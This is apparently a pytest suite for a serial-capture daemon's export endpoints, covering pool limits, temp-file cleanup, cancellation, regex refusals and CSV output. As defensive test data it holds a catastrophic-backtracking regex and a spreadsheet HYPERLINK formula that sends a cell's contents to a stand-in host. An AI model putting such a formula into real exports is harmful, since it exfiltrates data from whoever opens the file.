"""Streamed and built exports (SPEC 3.4): the session-export pool and its refusal, the temp
copies' lifetime, a first-page refusal as a real status, the CSV formula guard on `raw`, and
closing a stream's source when the client leaves."""

from __future__ import annotations

import asyncio
import contextlib
import json
import os
import socket
import threading
import time

import httpx
import pytest
from fastapi.testclient import TestClient

from mcuscope import server as server_mod
from mcuscope.config import Config, ServerConfig, StorageConfig
from mcuscope.server import EXPORT_QUEUE_MAX, EXPORT_WORKERS, create_app
from mcuscope.store import Store
from tests.support import Stack
from tests.test_e2e import poll

HOSTILE = "a" * 60 + "!"          # catastrophic for (a|aa)+$
HOSTILE_PATTERN = "(a|aa)+$"


def _app(tmp_path):
    config = Config(
        server=ServerConfig(host="127.0.0.1", port=0),
        storage=StorageConfig(db_path=str(tmp_path / "cap.db")),
    )
    return create_app(config, config_path=tmp_path / "config.toml")


def _client(app) -> TestClient:
    return TestClient(app, base_url="http://127.0.0.1", client=("127.0.0.1", 50000))


def _on_loop(c: TestClient, coro, timeout: float = 10.0):
    return asyncio.run_coroutine_threadsafe(coro, c.app.state.ports._loop).result(timeout)


def _temp_copies(tmp_path) -> list[str]:
    return sorted(n for n in os.listdir(tmp_path) if n.startswith("mcuscope-"))


class _BlockedBuild:
    """Stands in for Store.export_session_db: parks every build until released."""

    def __init__(self) -> None:
        self.release = threading.Event()
        self.entered = threading.Semaphore(0)
        self.threads: list[str] = []
        self.paths: list[str] = []

    def __call__(self, store, dest_path, **_kw) -> int:
        self.threads.append(threading.current_thread().name)
        self.paths.append(dest_path)
        self.entered.release()
        assert self.release.wait(20), "the test never released the build"
        return 0

    def wait_entered(self, n: int = 1) -> None:
        for _ in range(n):
            assert self.entered.acquire(timeout=10), "a build never started"


@pytest.fixture
def blocked(monkeypatch):
    fake = _BlockedBuild()
    monkeypatch.setattr(Store, "export_session_db",
                        lambda self, dest_path, **kw: fake(self, dest_path, **kw))
    yield fake
    fake.release.set()   # never leave a pool worker parked for the next test


def _session_id(c: TestClient) -> int:
    return c.get("/status").json()["session"]["id"]


# -- API-1: a pool of its own, and a refusal past its queue ----------------------------------


def test_exports_past_the_queue_are_refused_and_builds_run_off_the_default_pool(
    tmp_path, blocked
) -> None:
    admitted = EXPORT_WORKERS + EXPORT_QUEUE_MAX
    with _client(_app(tmp_path)) as c:
        sid = _session_id(c)
        results: list[int] = []
        threads = [
            threading.Thread(target=lambda: results.append(
                c.get(f"/sessions/{sid}/export").status_code))
            for _ in range(admitted)
        ]
        for t in threads:
            t.start()
        blocked.wait_entered(EXPORT_WORKERS)
        assert poll(lambda: c.app.state.export_builds == admitted, 5)
        refused = c.get(f"/sessions/{sid}/export")
        assert refused.status_code == 503
        assert refused.json()["error"] == "too many session exports in progress; try again shortly"
        blocked.release.set()
        for t in threads:
            t.join(10)
        assert results == [200] * admitted
        assert poll(lambda: c.app.state.export_builds == 0, 5), "a finished build kept its slot"
        assert c.get(f"/sessions/{sid}/export").status_code == 200
    assert blocked.threads and all(n.startswith("mcu-export") for n in blocked.threads)


# -- LIFECYCLE-2: temp copies never outlive the daemon's interest in them --------------------


def test_a_temp_copy_is_named_for_its_capture_and_gone_after_download(tmp_path, blocked) -> None:
    with _client(_app(tmp_path)) as c:
        key = c.app.state.export_key
        blocked.release.set()
        assert c.get(f"/sessions/{_session_id(c)}/export").status_code == 200
        name = os.path.basename(blocked.paths[0])
        assert name.startswith(f"mcuscope-session-{key}-") and name.endswith(".db")
        assert _temp_copies(tmp_path) == [] and c.app.state.export_files == set()


def test_a_cancelled_export_removes_its_copy_when_the_build_returns(tmp_path, blocked) -> None:
    with _client(_app(tmp_path)) as c:
        sid = _session_id(c)

        async def cancel_mid_build() -> None:
            transport = httpx.ASGITransport(app=c.app, client=("127.0.0.1", 1))
            async with httpx.AsyncClient(transport=transport, base_url="http://127.0.0.1") as ac:
                task = asyncio.ensure_future(ac.get(f"/sessions/{sid}/export"))
                await asyncio.to_thread(blocked.wait_entered)
                task.cancel()
                with contextlib.suppress(asyncio.CancelledError):
                    await task

        _on_loop(c, cancel_mid_build())
        assert os.path.exists(blocked.paths[0]), "positive control: the build made its copy"
        assert c.app.state.export_builds == 1, "a build still running must keep its slot"
        blocked.release.set()
        assert poll(lambda: not os.path.exists(blocked.paths[0]), 5), "the orphan stayed"
        assert poll(lambda: c.app.state.export_builds == 0, 5)
        assert c.app.state.export_files == set()


def test_a_stop_during_a_build_removes_its_copy(tmp_path, blocked) -> None:
    with _client(_app(tmp_path)) as c:
        sid = _session_id(c)
        ac = httpx.AsyncClient(
            transport=httpx.ASGITransport(app=c.app, client=("127.0.0.1", 1)),
            base_url="http://127.0.0.1",
        )
        asyncio.run_coroutine_threadsafe(
            ac.get(f"/sessions/{sid}/export"), c.app.state.ports._loop
        )
        blocked.wait_entered()
        path = blocked.paths[0]
        assert os.path.exists(path)
    # The lifespan has run its finaliser; the build itself is still parked.
    assert not os.path.exists(path), "the stop left the in-flight copy behind"


@pytest.mark.parametrize("order", ["abandoned first", "finished first"])
def test_an_abandoned_job_removes_its_files_whichever_side_ends_last(tmp_path, order) -> None:
    live: set[str] = set()
    job = server_mod._ExportJob(live, str(tmp_path / "cap.db"), "k")
    made: list[str] = []

    def build(j) -> str:
        made.append(j.mkstemp("session", ".db"))
        if order == "abandoned first":
            job.abandon()
        return made[0]

    assert job.run(build) == made[0]
    if order == "finished first":
        assert os.path.exists(made[0]), "positive control: a finished build keeps its file"
        job.abandon()
    assert not os.path.exists(made[0]) and live == set()


class _ProgressHook:
    """Takes the progress handler `_ExportJob.on_open` installs: a connection holds one
    handler, so the crawl below must call it rather than replace it."""

    handler = None

    def set_progress_handler(self, handler, _n) -> None:
        self.handler = handler


class _SlowCopy:
    """Wraps the real Store.export_session_db: its copy crawls (a progress handler sleeps),
    and how the copy ended is recorded, so an interrupt is told apart from a completion."""

    def __init__(self) -> None:
        self.started = threading.Event()
        self.outcome: list[str] = []
        self.paths: list[str] = []
        self.real = Store.export_session_db

    def __call__(self, store, dest_path, **kw):
        self.paths.append(dest_path)
        hook = kw.pop("on_open", None)

        def on_open(conn) -> None:
            job = _ProgressHook()
            if hook is not None:
                hook(job)

            def crawl() -> int:
                if conn.in_transaction:   # the INSERTs, not the schema or the ATTACH
                    self.started.set()
                    time.sleep(0.05)
                return job.handler() if job.handler is not None else 0

            conn.set_progress_handler(crawl, 100)

        try:
            n = self.real(store, dest_path, on_open=on_open, **kw)
        except BaseException as exc:
            self.outcome.append(f"raised {exc}")
            raise
        self.outcome.append(f"copied {n}")
        return n


def _seed(c: TestClient, n: int) -> None:
    store = c.app.state.store

    async def many() -> None:
        await asyncio.gather(*(
            store.add_line(ts=time.time(), port="board", dir="rx", chan="debug", seq=None,
                           raw=f"row {i}") for i in range(n)))

    _on_loop(c, many(), timeout=60)


@pytest.fixture
def slow(monkeypatch):
    fake = _SlowCopy()
    monkeypatch.setattr(Store, "export_session_db",
                        lambda self, dest_path, **kw: fake(self, dest_path, **kw))
    return fake


def test_a_cancelled_export_interrupts_its_copy(tmp_path, slow) -> None:
    with _client(_app(tmp_path)) as c:
        _seed(c, 3000)
        sid = _session_id(c)

        async def cancel_mid_copy() -> None:
            transport = httpx.ASGITransport(app=c.app, client=("127.0.0.1", 1))
            async with httpx.AsyncClient(transport=transport, base_url="http://127.0.0.1") as ac:
                task = asyncio.ensure_future(ac.get(f"/sessions/{sid}/export"))
                assert await asyncio.to_thread(slow.started.wait, 10), "the copy never ran"
                task.cancel()
                with contextlib.suppress(asyncio.CancelledError):
                    await task

        _on_loop(c, cancel_mid_copy(), timeout=20)
        assert poll(lambda: bool(slow.outcome), 10), "the copy was not stopped"
        assert "interrupted" in slow.outcome[0], slow.outcome   # stopped, not finished
        assert poll(lambda: not os.path.exists(slow.paths[0]), 5)
        assert _temp_copies(tmp_path) == []


def test_a_stop_interrupts_a_copy_in_flight(tmp_path, slow) -> None:
    with _client(_app(tmp_path)) as c:
        _seed(c, 3000)
        ac = httpx.AsyncClient(
            transport=httpx.ASGITransport(app=c.app, client=("127.0.0.1", 1)),
            base_url="http://127.0.0.1",
        )
        asyncio.run_coroutine_threadsafe(
            ac.get(f"/sessions/{_session_id(c)}/bundle"), c.app.state.ports._loop
        )
        assert slow.started.wait(10), "the copy never ran"
    assert poll(lambda: bool(slow.outcome), 10), "the stop left the copy running"
    assert "interrupted" in slow.outcome[0], slow.outcome   # stopped, not finished
    assert _temp_copies(tmp_path) == []


def test_an_abandon_between_open_and_the_first_statement_stops_the_copy(tmp_path) -> None:
    """The copy has its connection but has run no SQL when the abandon lands: an
    interrupt() then was lost, and the copy ran to the end."""
    import sqlite3

    with _client(_app(tmp_path)) as c:
        _seed(c, 3000)
        store = c.app.state.store
        session = {"id": 1, "name": "n", "note": "", "started_ts": 0.0, "ended_ts": None,
                   "start_id": 1, "end_id": None, "auto": 0}
        job = server_mod._ExportJob(set(), str(tmp_path / "cap.db"), "k")

        def on_open(conn) -> None:
            job.on_open(conn)
            job.abandon()

        def build(j: server_mod._ExportJob) -> str:
            path = j.mkstemp("session", ".db")
            copied.append(store.export_session_db(
                path, id_from=session["start_id"], id_to=None, session=session,
                on_open=on_open))
            return path

        copied: list[int] = []
        with pytest.raises(sqlite3.OperationalError, match="interrupted"):
            job.run(build)
        assert copied == [] and _temp_copies(tmp_path) == []


def test_an_export_opened_after_its_abandon_never_starts(tmp_path) -> None:
    import sqlite3

    job = server_mod._ExportJob(set(), str(tmp_path / "cap.db"), "k")
    job.on_open(sqlite3.connect(":memory:"))                  # positive control: accepted
    job.abandon()
    with pytest.raises(server_mod._ExportAbandoned):
        job.on_open(sqlite3.connect(":memory:"))


def test_a_cancelled_bundle_stops_while_writing_a_member(tmp_path, monkeypatch) -> None:
    writing = threading.Event()

    def endless():
        while True:
            writing.set()
            yield {"id": 1, "ts": 1.0, "port": "board", "dir": "rx", "chan": "debug",
                   "seq": None, "raw": "x" * 200}

    async def lines_export(self, **_kw):
        return endless()

    monkeypatch.setattr(Store, "open_lines_export", lines_export)
    with _client(_app(tmp_path)) as c:
        sid = _session_id(c)

        async def cancel_mid_member() -> None:
            transport = httpx.ASGITransport(app=c.app, client=("127.0.0.1", 1))
            async with httpx.AsyncClient(transport=transport, base_url="http://127.0.0.1") as ac:
                task = asyncio.ensure_future(ac.get(f"/sessions/{sid}/bundle"))
                assert await asyncio.to_thread(writing.wait, 10), "no member was written"
                task.cancel()
                with contextlib.suppress(asyncio.CancelledError):
                    await task

        _on_loop(c, cancel_mid_member(), timeout=20)
        # The build's own failure path removes its files, so they only go once it stops.
        assert poll(lambda: _temp_copies(tmp_path) == [], 10), "the abandoned bundle kept going"
        assert poll(lambda: c.app.state.export_builds == 0, 5)


def test_startup_sweeps_only_this_captures_leftovers(tmp_path) -> None:
    key = server_mod._export_key(str(tmp_path / "cap.db"))
    mine = [f"mcuscope-session-{key}-ab_c1234.db", f"mcuscope-session-{key}-ab_c1234.db-journal",
            f"mcuscope-bundle-{key}-zz9x0aaa.zip", f"mcuscope-bundle-{key}-zz9x0aab.db"]
    theirs = [f"mcuscope-session-{'0' * 8}-ab_c1234.db", "mcuscope-session-abcd1234.db",
              f"mcuscope-session-{key}-ab-c.db", "notes.txt"]
    for name in mine + theirs:
        (tmp_path / name).write_text("x")
    with _client(_app(tmp_path)):
        pass
    left = set(os.listdir(tmp_path))
    assert not left & set(mine), f"own leftovers survived: {left & set(mine)}"
    assert set(theirs) <= left, "the sweep touched a file that is not this capture's"


# -- API-3: a first-page refusal is a status, not a cut stream --------------------------------


def test_a_regex_that_trips_on_the_first_page_is_a_400(tmp_path) -> None:
    with _client(_app(tmp_path)) as c:
        c.post("/marker", json={"text": HOSTILE})
        ok = c.get("/lines/export", params={"match": "a+!", "format": "jsonl"})
        assert ok.status_code == 200 and HOSTILE in ok.text           # positive control
        r = c.get("/lines/export", params={"match": HOSTILE_PATTERN, "format": "csv"})
        assert r.status_code == 400, r.text
        assert "match pattern" in r.json()["error"]


# -- API-10: the CSV raw cell is guarded, jsonl stays faithful ------------------------------


def test_the_csv_raw_cell_is_formula_guarded_and_jsonl_is_faithful(tmp_path) -> None:
    payload = '=HYPERLINK("http://x/?"&A1,"ok")'
    with _client(_app(tmp_path)) as c:
        c.post("/marker", json={"text": payload})
        csv_text = c.get("/lines/export", params={"format": "csv", "chan": "marker"}).text
        row = csv_text.strip().splitlines()[-1]
        assert row.endswith(',"\'=HYPERLINK(""http://x/?""&A1,""ok"")"'), row
        assert ",-," in row, "dir `-` is daemon vocabulary and stays unguarded"
        jsonl = c.get("/lines/export", params={"format": "jsonl", "chan": "marker"}).text
        assert json.loads(jsonl.strip().splitlines()[-1])["raw"] == payload


# -- PERF-2: a stream's source is closed when the client leaves ------------------------------


STREAMS = {
    "/plot/export?names=v": ("iter_plot_export", {
        "line_id": 1, "ts": 1.0, "port": "board", "tick_ms": 1, "sid": None, "name": "v",
        "value": 1.0}),
    "/lines/export?format=csv": ("iter_lines_export", {
        "id": 1, "ts": 1.0, "port": "board", "dir": "rx", "chan": "debug", "seq": None,
        "raw": "x" * 200}),
    "/can/frames?format=csv": ("iter_can_export", {
        "line_id": 1, "ts": 1.0, "tick_ms": 1, "bus": 1, "can_id": 256, "ext": 0, "rtr": 0,
        "dlc": 2, "data_hex": "AABB"}),
}


@pytest.mark.parametrize("path", STREAMS)
def test_an_export_abandoned_after_its_headers_closes_its_source(stack: Stack, path) -> None:
    store = stack.app.state.store
    asyncio.run_coroutine_threadsafe(
        store.add_line(ts=time.time(), port="board", dir="rx", chan="event", seq=None,
                       raw="!p 1 v=1", plot=[(1, None, "v", 1.0)]),
        stack.app.state.ports._loop,
    ).result(5)
    attr, row = STREAMS[path]
    closed = threading.Event()
    started = threading.Event()

    def endless(**_kw):
        try:
            while True:
                started.set()
                yield row
        finally:
            closed.set()

    setattr(store, attr, endless)
    with socket.create_connection(("127.0.0.1", stack.http_port), timeout=5) as sock:
        sock.sendall(f"GET {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n".encode())
        assert sock.recv(4096).startswith(b"HTTP/1.1 200")   # what the UI's preflight reads
        assert started.wait(5)
    assert closed.wait(10), "the abandoned stream kept its source (and its read snapshot) open"
